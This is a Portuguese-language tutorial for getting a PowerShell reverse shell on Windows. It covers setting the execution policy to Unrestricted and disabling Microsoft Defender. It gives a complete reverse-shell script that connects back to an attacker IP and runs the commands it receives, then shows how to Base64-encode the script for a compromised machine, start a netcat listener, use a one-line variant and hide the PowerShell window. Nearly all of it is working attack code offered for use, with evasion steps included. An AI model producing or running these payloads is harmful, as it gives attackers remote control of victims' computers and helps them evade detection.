# Reverse Shell Windows PowerShell

## Como Habilitar a Execução de Scripts no Windows

1° __Abra o PowerShell como Administrador:__ Clique no menu Iniciar, digite PowerShell, clique com o botão direito sobre ele e selecione Executar como Administrador.

2° __Verifique a política atual (opcional):__ Digite Get-ExecutionPolicy e pressione Enter. (Geralmente estará como Restricted, que bloqueia a execução).

3° __Altere a permissão:__ Digite o comando abaixo e pressione Enter: ```Set-ExecutionPolicy Unrestricted```

4° __Confirme a alteração:__ O sistema exibirá um aviso de segurança. Digite S (para Sim) e pressione Enter.Agora, os seus scripts (.ps1) poderão ser executados normalmente.

5° __Desabilitar Microsoft Defender.__

Salve este script como reverse.ps1 em sua máquina Kali Linux. (Alterar IP e porta TCP conforme o ambiente)
```
$client = New-Object System.Net.Sockets.TCPClient('192.168.122.145',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex ". { $data } 2>&1" | Out-String ); 
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()}
$client.Close()
```
__Codifique o conteúdo reverse.ps1em Base64:__
```
cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0
```
Agora que você tem o comando codificado em Base64, pode executá-lo no shell web do PowerShell na máquina comprometida. 

__Use a seguinte sintaxe:__ 

```powershell -encodedcommand < String_Base64 >```

__Na sua máquina Kali, configure um ouvinte para capturar a conexão do shell reverso. Use o seguinte netcatpara isso:__
```
nc  -lnvp  4444
```
## Script de uma única linha 
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## Ocultar janela do powershell via CMD
```
C:\>powershell -WindowStyle Hidden -File "C:\caminho\para\seu-script.ps1"
``` 
